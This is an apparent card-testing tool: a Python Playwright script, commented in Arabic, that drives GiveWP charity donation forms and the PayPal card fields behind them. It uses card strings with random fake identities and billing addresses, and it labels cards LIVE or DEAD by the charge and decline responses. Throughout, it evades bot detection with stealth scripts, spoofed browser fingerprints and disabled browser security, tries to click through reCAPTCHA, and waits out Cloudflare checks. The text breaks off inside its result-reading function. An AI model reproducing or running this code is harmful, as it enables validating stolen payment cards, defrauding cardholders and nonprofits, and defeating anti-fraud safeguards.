#!/usr/bin/env python3
"""
GiveWP Playwright Ultimate v20
- متصفح حقيقي + stealth
- يتعامل مع Cloudflare / iframes / shadow DOM
- يملأ كل الحقول المطلوبة تلقائياً (billing, honoree, branch_selection, terms)
- يختار المبلغ بأي طريقة (زر / radio / input / select)
- يضغط زر التبرع الحقيقي
- يتعامل مع PayPal Commerce iframe (card number, expiry, cvv, billing)
- يعترض الردود من الشبكة (confirm-payment-source / approve_order)
- يقرأ النتيجة النهائية من الصفحة + الشبكة
- retry + human-like behavior
"""

import asyncio
import re
import random
import time
import json
from urllib.parse import urlparse

# ═══════════════════════════════════════════════════════════════════
# TRY PLAYWRIGHT + STEALTH
# ═══════════════════════════════════════════════════════════════════
try:
    from playwright.async_api import async_playwright, TimeoutError as PWTimeout
    HAS_PW = True
except ImportError:
    HAS_PW = False
    print("❌ playwright not installed. Run: pip install playwright && playwright install chromium")

# stealth: نجرب pw-stealth-enhanced أو playwright-stealth
STEALTH_MODE = None
try:
    from pw_stealth_enhanced import apply_stealth as apply_stealth_enhanced
    STEALTH_MODE = 'enhanced'
except ImportError:
    try:
        from playwright_stealth import Stealth
        STEALTH_MODE = 'classic'
    except ImportError:
        STEALTH_MODE = None

print(f"🔧 stealth mode: {STEALTH_MODE or 'manual'}")


# ═══════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════
UA_POOL = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
]

FIRST_NAMES = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph']
LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis']
STREETS = ['123 Main Street', '456 Oak Avenue', '789 Pine Road', '321 Elm Boulevard']
CITIES = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia']
STATES = ['NY', 'CA', 'IL', 'TX', 'AZ', 'PA']
ZIPS = ['10001', '90001', '60601', '77001', '85001', '19101']
COUNTRIES = ['US', 'United States']


# ═══════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════
async def human_delay(min_s=0.5, max_s=1.5):
    await asyncio.sleep(random.uniform(min_s, max_s))


async def human_type(locator, text):
    """يكتب حرف حرف مع تأخير"""
    await locator.click()
    await human_delay(0.2, 0.5)
    await locator.fill('')
    for ch in str(text):
        await locator.type(ch, delay=random.randint(50, 150))
    await human_delay(0.2, 0.5)


async def scroll_page(page):
    """scroll بطيء يحاكي الإنسان"""
    for _ in range(random.randint(2, 4)):
        await page.mouse.wheel(0, random.randint(200, 500))
        await human_delay(0.3, 0.8)


# ═══════════════════════════════════════════════════════════════════
# CLASSIFIER
# ═══════════════════════════════════════════════════════════════════
class ResultClassifier:
    LIVE = [
        ('CHARGE_SUCCESS', ['success', 'approved', 'charged', 'completed', 'thank you',
                            'payment successful', 'donation complete', 'status":"COMPLETED']),
        ('ORDER_NOT_APPROVED', ['order_not_approved', 'not yet approved']),
        ('APPROVED_PENDING_CAPTURE', ['paypal orders are captured', 'pending capture']),
        ('INSUFFICIENT_FUNDS', ['insufficient', 'not enough', 'nsf']),
        ('DO_NOT_HONOR', ['do not honor']),
        ('ACCOUNT_CLOSED', ['account closed', 'account locked']),
        ('CVV_FAILURE', ['cvv', 'security code']),
        ('EXPIRED_CARD', ['expired']),
        ('SUSPECTED_FRAUD', ['suspected fraud', 'fraud']),
        ('PAYER_CANNOT_PAY', ['payer cannot pay', 'cannot pay']),
        ('GENERIC_DECLINE', ['generic decline']),
        ('RESTRICTED', ['restricted', 'blocked', 'inactive']),
        ('INVALID_CARD', ['invalid card', 'invalid number']),
        ('3DS_REQUIRED', ['authentication required', '3d secure', 'verify']),
        ('PAYER_ACTION_REQUIRED', ['payer action required']),
        ('LIMIT_EXCEEDED', ['limit exceeded', 'attempts exceed']),
    ]

    DEAD = [
        ('CLOUDFLARE', ['just a moment', 'checking your browser', 'verifying you are',
                        'cf-browser-verification', 'cf_chl']),
        ('CAPTCHA', ['captcha', 'not a robot', 'recaptcha', 'hcaptcha']),
        ('GATEWAY_DISABLED', ['gateway is not enabled', 'payment gateway is not']),
        ('JS_CONFLICT', ['javascript conflict', 'connection between this site']),
        ('FORM_NOT_PUBLISHED', ['form not published', 'no form']),
        ('AMOUNT_INVALID', ['donation amount', 'invalid', 'minimum']),
        ('SPAM', ['spam']),
        ('FIELDS_REQUIRED', ['required field', 'billing address', 'zip', 'city']),
        ('BRANCH_REQUIRED', ['branch_selection']),
        ('TERMS_REQUIRED', ['agree_to_terms', 'terms and conditions']),
        ('HONOREE_REQUIRED', ["honoree's first name", 'honoree']),
        ('NO_PAYPAL', ['paypal not available', 'paypal is not']),
        ('NO_FORM', ['form not found', 'no donation form']),
    ]

    @classmethod
    def classify(cls, text):
        if not text:
            return 'DEAD', 'EMPTY'
        low = text.lower()

        for code, kws in cls.DEAD:
            for kw in kws:
                if kw in low:
                    return 'DEAD', code

        for code, kws in cls.LIVE:
            for kw in kws:
                if kw in low:
                    return 'LIVE', code

        return 'UNKNOWN', 'UNKNOWN'


# ═══════════════════════════════════════════════════════════════════
# MAIN ENGINE
# ═══════════════════════════════════════════════════════════════════
class GiveWPPlaywright:
    def __init__(self, url, card, verbose=True, screenshots=False):
        self.url = url
        self.card = card
        self.verbose = verbose
        self.screenshots = screenshots
        self.debug = {
            'url': url,
            'steps': [],
            'network': [],
            'paypal_responses': [],
            'screenshots': [],
            'form_found': None,
            'amount_selected': None,
            'paypal_frame': False,
            'card_filled': False,
            'captcha_detected': False,
        }

    def log(self, msg):
        if self.verbose:
            print(msg)
        self.debug['steps'].append(msg)

    async def _screenshot(self, page, name):
        if not self.screenshots:
            return
        try:
            path = f'/tmp/pw_{name}_{int(time.time())}.png'
            await page.screenshot(path=path, full_page=False)
            self.debug['screenshots'].append(path)
            self.log(f'      📸 {path}')
        except:
            pass

    # ─────────────────────────────────────────────────────────────
    # STEALTH
    # ─────────────────────────────────────────────────────────────
    async def _apply_stealth(self, context):
        if STEALTH_MODE == 'enhanced':
            try:
                await apply_stealth_enhanced(
                    context,
                    locale='en-US',
                    timezone_id='America/New_York',
                )
                self.log('  ✅ stealth: enhanced')
                return
            except Exception as e:
                self.log(f'  ⚠️ enhanced stealth failed: {e}')

        if STEALTH_MODE == 'classic':
            try:
                stealth = Stealth()
                await stealth.apply_stealth_async(context)
                self.log('  ✅ stealth: classic')
                return
            except Exception as e:
                self.log(f'  ⚠️ classic stealth failed: {e}')

        # manual stealth
        await context.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
            Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
            Object.defineProperty(navigator, 'languages', {get: () => ['en-US','en']});
            window.chrome = {runtime: {}, app: {}, csi: () => {}, loadTimes: () => {}};
            const originalQuery = window.navigator.permissions.query;
            window.navigator.permissions.query = (parameters) => (
                parameters.name === 'notifications' ?
                Promise.resolve({state: Notification.permission}) :
                originalQuery(parameters)
            );
            // WebGL spoof
            const getParameter = WebGLRenderingContext.prototype.getParameter;
            WebGLRenderingContext.prototype.getParameter = function(parameter) {
                if (parameter === 37445) return 'Intel Inc.';
                if (parameter === 37446) return 'Intel Iris OpenGL Engine';
                return getParameter(parameter);
            };
        """)
        self.log('  ✅ stealth: manual')

    # ─────────────────────────────────────────────────────────────
    # NETWORK INTERCEPTION
    # ─────────────────────────────────────────────────────────────
    async def _on_response(self, response):
        try:
            url = response.url
            if any(k in url for k in [
                'create_order', 'confirm-payment', 'approve_order',
                'checkout/orders', 'paypal.com/v2', 'give_process_donation',
                'admin-ajax.php'
            ]):
                body = ''
                try:
                    body = await response.text()
                except:
                    pass
                self.debug['network'].append({
                    'url': url[:150],
                    'status': response.status,
                    'body': body[:1000],
                })
                if 'paypal.com' in url or 'confirm-payment' in url or 'approve_order' in url:
                    self.debug['paypal_responses'].append({
                        'status': response.status,
                        'body': body[:1000],
                    })
        except:
            pass

    # ─────────────────────────────────────────────────────────────
    # MAIN RUN
    # ─────────────────────────────────────────────────────────────
    async def run(self):
        if not HAS_PW:
            return {'status': 'DEAD', 'code': 'PLAYWRIGHT_NOT_INSTALLED',
                    'raw': 'pip install playwright && playwright install chromium',
                    'debug': self.debug}

        async with async_playwright() as p:
            self.log('  🚀 launching chromium...')

            try:
                browser = await p.chromium.launch(
                    headless=True,
                    args=[
                        '--no-sandbox',
                        '--disable-setuid-sandbox',
                        '--disable-blink-features=AutomationControlled',
                        '--disable-dev-shm-usage',
                        '--disable-gpu',
                        '--no-first-run',
                        '--no-zygote',
                        '--disable-features=IsolateOrigins,site-per-process',
                        '--disable-web-security',
                        '--ignore-certificate-errors',
                        '--allow-running-insecure-content',
                        '--window-size=1366,900',
                    ]
                )
            except Exception as e:
                return {'status': 'DEAD', 'code': f'LAUNCH_FAILED: {str(e)[:100]}',
                        'debug': self.debug}

            try:
                context = await browser.new_context(
                    user_agent=random.choice(UA_POOL),
                    viewport={'width': 1366, 'height': 900},
                    locale='en-US',
                    timezone_id='America/New_York',
                    ignore_https_errors=True,
                    java_script_enabled=True,
                    extra_http_headers={
                        'Accept-Language': 'en-US,en;q=0.9',
                        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                    }
                )

                await self._apply_stealth(context)

                page = await context.new_page()
                page.on('response', self._on_response)

                result = await self._execute(page)
                return result
            finally:
                try:
                    await browser.close()
                except:
                    pass

    # ─────────────────────────────────────────────────────────────
    # EXECUTE STAGES
    # ─────────────────────────────────────────────────────────────
    async def _execute(self, page):
        # ═══ Stage 1: Load ═══
        self.log(f'\n[1] Loading {self.url}')
        try:
            await page.goto(self.url, wait_until='domcontentloaded', timeout=45000)
        except PWTimeout:
            self.log('      ⚠️ timeout, continuing...')
        except Exception as e:
            return {'status': 'DEAD', 'code': f'GOTO_FAILED: {str(e)[:100]}',
                    'debug': self.debug}

        await human_delay(2, 4)
        await self._screenshot(page, '01_loaded')

        # ═══ Stage 2: Cloudflare ═══
        self.log('  [2] checking cloudflare...')
        html = await page.content()
        if any(x in html.lower() for x in ['just a moment', 'verifying you are',
                                            'checking your browser', 'cf-browser-verification']):
            self.log('      ⚠️ Cloudflare — waiting up to 25s...')
            for i in range(5):
                await human_delay(4, 6)
                html = await page.content()
                if 'just a moment' not in html.lower() and 'verifying' not in html.lower():
                    self.log(f'      ✅ passed after {(i+1)*5}s')
                    break
            else:
                return {'status': 'DEAD', 'code': 'CLOUDFLARE', 'raw': 'cloudflare blocked',
                        'debug': self.debug}

        # ═══ Stage 3: CAPTCHA check ═══
        self.log('  [3] checking captcha...')
        if await self._has_captcha(page):
            self.debug['captcha_detected'] = True
            self.log('      ⚠️ CAPTCHA detected — attempting bypass...')
            bypassed = await self._try_bypass_captcha(page)
            if not bypassed:
                self.log('      ❌ CAPTCHA could not be bypassed')
                # نكمل برضو — ممكن تكون invisible recaptcha
                # return {'status': 'DEAD', 'code': 'CAPTCHA', ...}
            else:
                self.log('      ✅ CAPTCHA bypassed (or invisible)')

        # ═══ Stage 4: Find form ═══
        self.log('  [4] finding form...')
        form_info = await self._find_form(page)
        if not form_info:
            return {'status': 'DEAD', 'code': 'NO_FORM',
                    'raw': 'give form not found in main page or iframes',
                    'debug': self.debug}
        self.debug['form_found'] = form_info['type']
        self.log(f'      ✅ form: {form_info["type"]}')

        # ═══ Stage 5: Fill personal ═══
        self.log('  [5] filling personal data...')
        await self._fill_personal(page)

        # ═══ Stage 6: Select amount ═══
        self.log('  [6] selecting amount...')
        amount = await self._select_amount_smart(page)
        self.debug['amount_selected'] = amount
        if amount:
            self.log(f'      ✅ amount: ${amount}')
        else:
            self.log(f'      ⚠️ could not select amount')

        # ═══ Stage 7: Fill billing ═══
        self.log('  [7] filling billing (if present)...')
        await self._fill_billing(page)

        # ═══ Stage 8: Fill all required selects/radios ═══
        self.log('  [8] filling required selects/radios/checkboxes...')
        await self._fill_all_required(page)

        # ═══ Stage 9: Accept terms ═══
        self.log('  [9] accepting terms...')
        await self._check_terms(page)

        # ═══ Stage 10: Click donate ═══
        self.log('  [10] clicking donate...')
        clicked = await self._click_donate(page)
        if not clicked:
            return {'status': 'DEAD', 'code': 'CLICK_FAILED',
                    'raw': 'donate button not clickable',
                    'debug': self.debug}

        await human_delay(3, 5)
        await self._screenshot(page, '02_after_click')

        # ═══ Stage 11: Wait for PayPal or result ═══
        self.log('  [11] waiting for PayPal or result...')
        paypal = await self._wait_paypal(page, timeout=25)

        if not paypal:
            page_text = await page.inner_text('body')
            status, code = ResultClassifier.classify(page_text)
            if status == 'LIVE':
                return {'status': 'LIVE', 'code': code, 'raw': page_text[:500],
                        'debug': self.debug}
            if status == 'DEAD':
                return {'status': 'DEAD', 'code': code, 'raw': page_text[:500],
                        'debug': self.debug}
            # ممكن يكون راح لصفحة شكر
            if any(x in page_text.lower() for x in ['thank', 'success', 'completed']):
                return {'status': 'LIVE', 'code': 'CHARGE_SUCCESS', 'raw': page_text[:500],
                        'debug': self.debug}
            return {'status': 'DEAD', 'code': 'NO_PAYPAL', 'raw': page_text[:300],
                    'debug': self.debug}

        self.debug['paypal_frame'] = True
        self.log('      ✅ PayPal frame found')

        # ═══ Stage 12: Fill card ═══
        self.log('  [12] filling card in PayPal...')
        card_result = await self._fill_card_paypal(paypal, page)
        self.debug['card_filled'] = card_result.get('filled', False)
        if not card_result.get('filled'):
            return {'status': 'DEAD', 'code': 'CARD_FILL_FAILED',
                    'raw': card_result.get('error', ''),
                    'debug': self.debug}

        # ═══ Stage 13: Submit payment ═══
        self.log('  [13] submitting payment...')
        await self._submit_payment(paypal, page)

        # ═══ Stage 14: Read final result ═══
        self.log('  [14] reading final result...')
        await human_delay(4, 6)
        await self._screenshot(page, '03_final')

        final = await self._read_final_result(page, paypal)
        final['debug'] = self.debug
        return final

    # ─────────────────────────────────────────────────────────────
    # CAPTCHA
    # ─────────────────────────────────────────────────────────────
    async def _has_captcha(self, page):
        html = await page.content()
        return any(x in html.lower() for x in [
            'g-recaptcha', 'hcaptcha', 'cf-turnstile', 'recaptcha/api.js'
        ])

    async def _try_bypass_captcha(self, page):
        """محاولة تجاوز reCAPTCHA — نقر على checkbox، أو انتظار إذا كانت invisible"""
        # 1. reCAPTCHA v2 checkbox
        try:
            # ابحث في كل الفريمات
            for frame in page.frames:
                if 'recaptcha' in frame.url.lower() or 'hcaptcha' in frame.url.lower():
                    try:
                        # checkbox
                        checkbox = frame.locator('#recaptcha-anchor, .recaptcha-checkbox, #checkbox')
                        if await checkbox.count() > 0:
                            await checkbox.first.click()
                            self.log('      ✅ clicked recaptcha checkbox')
                            await human_delay(3, 5)
                            # تحقق إذا أصبح checked
                            checked = await checkbox.first.get_attribute('aria-checked')
                            if checked == 'true':
                                return True
                    except:
                        pass
        except:
            pass

        # 2. إذا كانت invisible (v3)، قد تمر بدون نقر — ننتظر
        await human_delay(2, 3)

        # 3. نتحقق من وجود hidden response
        try:
            response = await page.evaluate("""
                () => {
                    const el = document.querySelector('[name="g-recaptcha-response"]');
                    return el ? el.value : '';
                }
            """)
            if response and len(response) > 10:
                self.log('      ✅ invisible recaptcha passed')
                return True
        except:
            pass

        # 4. قد يكون الموقع لا يفرض التحقق — نكمل
        self.log('      ⚠️ captcha may block, but continuing...')
        return False

    # ─────────────────────────────────────────────────────────────
    # FIND FORM (main + iframes)
    # ─────────────────────────────────────────────────────────────
    async def _find_form(self, page):
        """يبحث عن form في الصفحة الرئيسية + كل الإطارات"""
        # 1. main page
        selectors = [
            'form.give-form',
            'form[id*="give-form"]',
            '.give-form-wrap form',
            'form[class*="give"]',
            'input[name="give-amount"]',
            'form[id*="give"]',
        ]
        for sel in selectors:
            try:
                loc = page.locator(sel).first
                if await loc.count() > 0:
                    inputs = await page.locator(f'{sel} input').count()
                    if inputs > 0 or sel == 'input[name="give-amount"]':
                        return {'type': 'main', 'selector': sel, 'frame': page.main_frame}
            except:
                continue

        # 2. iframes
        for frame in page.frames:
            if frame == page.main_frame:
                continue
            try:
                for sel in selectors:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0:
                        inputs = await frame.locator(f'{sel} input').count()
                        if inputs > 0 or sel == 'input[name="give-amount"]':
                            return {'type': 'iframe', 'selector': sel, 'frame': frame}
            except:
                continue

        return None

    # ─────────────────────────────────────────────────────────────
    # FILL PERSONAL
    # ─────────────────────────────────────────────────────────────
    async def _fill_personal(self, page):
        first = random.choice(FIRST_NAMES)
        last = random.choice(LAST_NAMES)
        email = f'user{int(time.time()*1000)%999999}@gmail.com'

        # نبحث في كل الإطارات
        for frame in page.frames:
            try:
                fills = [
                    ('input[name="give_first"]', first),
                    ('input[name="give_last"]', last),
                    ('input[name="give_email"]', email),
                    ('input[name*="first_name"]', first),
                    ('input[name*="last_name"]', last),
                    ('input[type="email"]', email),
                    ('input[name*="email"]', email),
                ]
                for sel, val in fills:
                    try:
                        loc = frame.locator(sel).first
                        if await loc.count() > 0 and await loc.is_visible(timeout=500):
                            await human_type(loc, val)
                    except:
                        continue
            except:
                continue

    # ─────────────────────────────────────────────────────────────
    # SELECT AMOUNT — 10 طرق
    # ─────────────────────────────────────────────────────────────
    async def _select_amount_smart(self, page):
        amounts = ['1', '2', '3', '5', '10', '20', '25', '50', '100']

        # نبدأ بالمبلغ الأدنى من الفورم (إن وجد)
        for frame in page.frames:
            try:
                loc = frame.locator('input[name="give-form-minimum"]').first
                if await loc.count() > 0:
                    min_val = await loc.get_attribute('value')
                    if min_val and float(min_val) > 0:
                        amounts.insert(0, str(int(float(min_val))) if float(min_val).is_integer() else min_val)
            except:
                pass

        for amt in amounts:
            for frame in page.frames:
                result = await self._try_select_amount_in_frame(frame, amt)
                if result:
                    return result
        return None

    async def _try_select_amount_in_frame(self, frame, amt):
        # 1. input[name="give-amount"]
        try:
            inp = frame.locator('input[name="give-amount"]').first
            if await inp.count() > 0 and await inp.is_visible(timeout=500):
                await human_type(inp, amt)
                return amt
        except:
            pass

        # 2. custom amount input
        try:
            inp = frame.locator('input[name="give-custom-amount"], input.give-custom-amount, input[id*="custom-amount"]').first
            if await inp.count() > 0 and await inp.is_visible(timeout=500):
                await human_type(inp, amt)
                return amt
        except:
            pass

        # 3. button/div with data-price
        for val in [amt, f'{amt}.00', f'{amt}.0']:
            try:
                el = frame.locator(f'[data-price="{val}"]').first
                if await el.count() > 0:
                    await el.scroll_into_view_if_needed()
                    await el.click()
                    return amt
            except:
                pass

        # 4. radio input
        for val in [amt, f'{amt}.00']:
            try:
                radio = frame.locator(f'input[type="radio"][value="{val}"]').first
                if await radio.count() > 0:
                    await radio.check(force=True)
                    return amt
            except:
                pass

        # 5. button with text $amt
        try:
            btn = frame.get_by_role('button', name=re.compile(rf'^\${amt}(\.00)?$')).first
            if await btn.count() > 0:
                await btn.click()
                return amt
        except:
            pass

        # 6. select option
        try:
            for sel_name in ['select[name*="amount"]', 'select[name="give-amount"]',
                            'select.give-amount', 'select[id*="amount"]']:
                sel = frame.locator(sel_name).first
                if await sel.count() > 0:
                    try:
                        await sel.select_option(amt)
                        return amt
                    except:
                        try:
                            await sel.select_option(f'{amt}.00')
                            return amt
                        except:
                            pass
        except:
            pass

        # 7. link with $amt
        try:
            link = frame.get_by_role('link', name=re.compile(rf'^\${amt}(\.00)?$')).first
            if await link.count() > 0:
                await link.click()
                return amt
        except:
            pass

        # 8. clickable div/li with data-price
        try:
            el = frame.locator(f'.give-donation-level-btn[data-price="{amt}"], li[data-price="{amt}"], div[data-price="{amt}"]').first
            if await el.count() > 0:
                await el.click()
                return amt
        except:
            pass

        # 9. radio with label text $amt
        try:
            label = frame.locator(f'label:has-text("${amt}")').first
            if await label.count() > 0:
                await label.click()
                return amt
        except:
            pass

        return None

    # ─────────────────────────────────────────────────────────────
    # FILL BILLING
    # ─────────────────────────────────────────────────────────────
    async def _fill_billing(self, page):
        first = random.choice(FIRST_NAMES)
        last = random.choice(LAST_NAMES)
        street = random.choice(STREETS)
        city = random.choice(CITIES)
        state = random.choice(STATES)
        zipcode = random.choice(ZIPS)

        billing_map = [
            (r'input[name*="billing"][name*="first"]', first),
            (r'input[name*="billing"][name*="last"]', last),
            (r'input[name*="address"]', street),
            (r'input[name*="street"]', street),
            (r'input[name*="city"]', city),
            (r'input[name*="zip"]', zipcode),
            (r'input[name*="postal"]', zipcode),
            (r'input[name*="phone"]', '5551234567'),
            (r'input[name*="billing_city"]', city),
            (r'input[name*="billing_zip"]', zipcode),
        ]

        for frame in page.frames:
            for sel, val in billing_map:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0 and await loc.is_visible(timeout=300):
                        tag = await loc.evaluate('el => el.tagName.toLowerCase()')
                        if tag == 'select':
                            try:
                                await loc.select_option(val)
                            except:
                                try:
                                    await loc.select_option(index=1)
                                except:
                                    pass
                        else:
                            await human_type(loc, val)
                except:
                    continue

            # selects: billing_country / billing_state / card_state
            for name in ['billing_country', 'mailing_country', 'card_country']:
                try:
                    loc = frame.locator(f'select[name="{name}"]').first
                    if await loc.count() > 0:
                        await loc.select_option('US')
                except:
                    continue
            for name in ['billing_state', 'mailing_state', 'card_state']:
                try:
                    loc = frame.locator(f'select[name="{name}"]').first
                    if await loc.count() > 0:
                        await loc.select_option(state)
                except:
                    continue

    # ─────────────────────────────────────────────────────────────
    # FILL ALL REQUIRED (selects, radios, checkboxes, text)
    # ─────────────────────────────────────────────────────────────
    async def _fill_all_required(self, page):
        for frame in page.frames:
            # selects
            try:
                selects = await frame.locator('select').all()
                for sel in selects:
                    try:
                        name = await sel.get_attribute('name') or ''
                        if not name:
                            continue
                        # تجنب selects المهمة التي ملأناها بالفعل
                        if any(k in name.lower() for k in ['country', 'state', 'billing', 'mailing', 'card_']):
                            continue
                        opts = await sel.locator('option').all()
                        valid = []
                        for opt in opts:
                            v = await opt.get_attribute('value')
                            if v and v not in ('', '0', '-1'):
                                valid.append(v)
                        if valid:
                            await sel.select_option(valid[0])
                    except:
                        continue
            except:
                pass

            # radios (non-payment)
            try:
                radios = await frame.locator('input[type="radio"]').all()
                seen_names = set()
                for radio in radios:
                    try:
                        name = await radio.get_attribute('name') or ''
                        if not name or name in seen_names:
                            continue
                        if 'payment-mode' in name.lower() or 'gateway' in name.lower():
                            continue
                        # check first radio in group
                        await radio.check(force=True)
                        seen_names.add(name)
                    except:
                        continue
            except:
                pass

            # required text inputs
            try:
                req_inputs = await frame.locator('input[required], input[aria-required="true"]').all()
                for inp in req_inputs:
                    try:
                        name = await inp.get_attribute('name') or ''
                        if any(k in name.lower() for k in ['first', 'last', 'email', 'address', 'city', 'zip', 'phone']):
                            continue  # already filled
                        if await inp.is_visible(timeout=200):
                            tag_type = await inp.get_attribute('type') or 'text'
                            if tag_type in ('text', 'tel', 'number'):
                                await human_type(inp, 'Test')
                    except:
                        continue
            except:
                pass

    # ─────────────────────────────────────────────────────────────
    # TERMS
    # ─────────────────────────────────────────────────────────────
    async def _check_terms(self, page):
        for frame in page.frames:
            try:
                cbs = await frame.locator(
                    'input[type="checkbox"][name*="terms"], '
                    'input[type="checkbox"][name*="agree"], '
                    'input[type="checkbox"][name*="condition"], '
                    'input[type="checkbox"][name*="accept"]'
                ).all()
                for cb in cbs:
                    try:
                        if not await cb.is_checked():
                            await cb.check(force=True, timeout=2000)
                    except:
                        try:
                            await cb.click(force=True, timeout=2000)
                        except:
                            pass
            except:
                continue

    # ─────────────────────────────────────────────────────────────
    # CLICK DONATE
    # ─────────────────────────────────────────────────────────────
    async def _click_donate(self, page):
        selectors = [
            'button.give-submit',
            'input.give-submit',
            'button[type="submit"][class*="give"]',
            'input[type="submit"][value*="Donate" i]',
            'button:has-text("Donate Now")',
            'button:has-text("Donate")',
            'button:has-text("Give Now")',
            'button:has-text("Give")',
            'button:has-text("Submit")',
            'button[type="submit"]',
            'input[type="submit"]',
        ]

        for frame in page.frames:
            for sel in selectors:
                try:
                    btn = frame.locator(sel).first
                    if await btn.count() > 0 and await btn.is_visible(timeout=800):
                        await btn.scroll_into_view_if_needed()
                        await human_delay(0.3, 0.8)
                        try:
                            await btn.click(timeout=5000)
                        except:
                            await btn.click(force=True, timeout=5000)
                        self.log(f'      ✅ clicked: {sel}')
                        return True
                except:
                    continue
        return False

    # ─────────────────────────────────────────────────────────────
    # WAIT PAYPAL
    # ─────────────────────────────────────────────────────────────
    async def _wait_paypal(self, page, timeout=25):
        iterations = timeout * 2

        for i in range(iterations):
            # 1. frames
            for frame in page.frames:
                if frame == page.main_frame:
                    continue
                furl = frame.url.lower()
                if any(k in furl for k in ['paypal', 'braintree', 'card-fields', 'hosted-fields']):
                    try:
                        cnt = await frame.locator('input').count()
                        if cnt > 0:
                            return frame
                    except:
                        continue

            # 2. iframe elements
            try:
                iframes = await page.locator('iframe').all()
                for iframe in iframes:
                    try:
                        src = await iframe.get_attribute('src') or ''
                        title = await iframe.get_attribute('title') or ''
                        if any(k in (src + title).lower() for k in ['paypal', 'braintree', 'card']):
                            fr = await iframe.content_frame()
                            if fr:
                                try:
                                    cnt = await fr.locator('input').count()
                                    if cnt > 0:
                                        return fr
                                except:
                                    pass
                    except:
                        continue
            except:
                pass

            # 3. inline card form in main page
            try:
                card = page.locator(
                    'input[autocomplete="cc-number"], '
                    'input[name*="cardnumber"], '
                    'input[name*="card-number"]'
                ).first
                if await card.count() > 0:
                    return page
            except:
                pass

            await page.wait_for_timeout(500)

        return None

    # ─────────────────────────────────────────────────────────────
    # FILL CARD PAYPAL
    # ─────────────────────────────────────────────────────────────
    async def _fill_card_paypal(self, frame, page):
        try:
            parts = self.card.strip().split('|')
            n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3].strip()
            mm = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]

            await asyncio.sleep(2)

            # email (PayPal قد يطلبه)
            for sel in ['input[type="email"]', 'input[name*="email"]', 'input[id*="email"]']:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0 and await loc.is_visible(timeout=500):
                        await human_type(loc, f'u{int(time.time()*1000)%999999}@gmail.com')
                        break
                except:
                    continue

            # card number
            card_filled = False
            for sel in [
                'input#credit-card-number',
                'input[name="cardnumber"]',
                'input[name="card-number"]',
                'input[name="cardNumber"]',
                'input[autocomplete="cc-number"]',
                'input[placeholder*="Card number" i]',
                'input[placeholder*="Card Number" i]',
                'input[placeholder*="card" i][type="tel"]',
                'input[type="tel"][name*="card"]',
                'input[data-testid*="card"]',
            ]:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0:
                        await loc.click()
                        await human_delay(0.3, 0.7)
                        await loc.fill('')
                        for ch in n:
                            await loc.type(ch, delay=random.randint(30, 80))
                        card_filled = True
                        self.log('      ✅ card number')
                        break
                except:
                    continue

            if not card_filled:
                return {'filled': False, 'error': 'CARD_NUMBER_NOT_FOUND'}

            await human_delay(0.5, 1)

            # expiry
            for sel in [
                'input#expiration-date',
                'input[name="exp"]',
                'input[name="expiry"]',
                'input[name="expiration"]',
                'input[autocomplete="cc-exp"]',
                'input[placeholder*="MM / YY" i]',
                'input[placeholder*="MM/YY" i]',
                'input[placeholder*="expiration" i]',
                'input[placeholder*="expiry" i]',
                'input[name*="expire"]',
            ]:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0:
                        await loc.click()
                        await loc.fill('')
                        await loc.type(f'{mm}{yy}', delay=random.randint(30, 80))
                        self.log('      ✅ expiry')
                        break
                except:
                    continue

            # cvc
            for sel in [
                'input#cvv',
                'input#cvc',
                'input[name="cvv"]',
                'input[name="cvc"]',
                'input[name="securityCode"]',
                'input[autocomplete="cc-csc"]',
                'input[placeholder*="CVV" i]',
                'input[placeholder*="CVC" i]',
                'input[placeholder*="security code" i]',
            ]:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0:
                        await loc.click()
                        await loc.fill('')
                        await loc.type(cvc, delay=random.randint(30, 80))
                        self.log('      ✅ cvc')
                        break
                except:
                    continue

            await human_delay(0.5, 1)
            return {'filled': True}
        except Exception as e:
            return {'filled': False, 'error': str(e)[:200]}

    # ─────────────────────────────────────────────────────────────
    # SUBMIT PAYMENT
    # ─────────────────────────────────────────────────────────────
    async def _submit_payment(self, frame, page):
        selectors = [
            'button:has-text("Pay")',
            'button:has-text("Continue")',
            'button:has-text("Complete")',
            'button:has-text("Submit")',
            'button[type="submit"]',
            'button#btn-pay',
            'button[id*="pay"]',
            'button[data-testid*="pay"]',
        ]
        for sel in selectors:
            try:
                btn = frame.locator(sel).first
                if await btn.count() > 0 and await btn.is_visible(timeout=800):
                    await btn.click(timeout=5000)
                    self.log(f'      ✅ payment submitted')
                    return True
            except:
                continue
        return False

    # ─────────────────────────────────────────────────────────────
    # READ FINAL RESULT
    # ─────────────────────────────────────────────────────────────
    async def _read_final_result(self, page, frame):
        # 1. network responses
        for resp in self.debug['paypal_responses']:
            text = resp.get('body', '')
            status, code = ResultClassifier.classify(text)
            if status == 'LIVE' or code not in ('UNKNOWN', 'EMPTY'):
                return {'status': status, 'code': code, 'raw': text[:500]}

        # 2. page text
        texts = []
        try:
            if frame:
                texts.append(await frame.inner_text('body'))
        except:
            pass
        try:
            texts.append(await page.inner_text('body'))
        except:
            pass

        for text in texts:
            if not text:
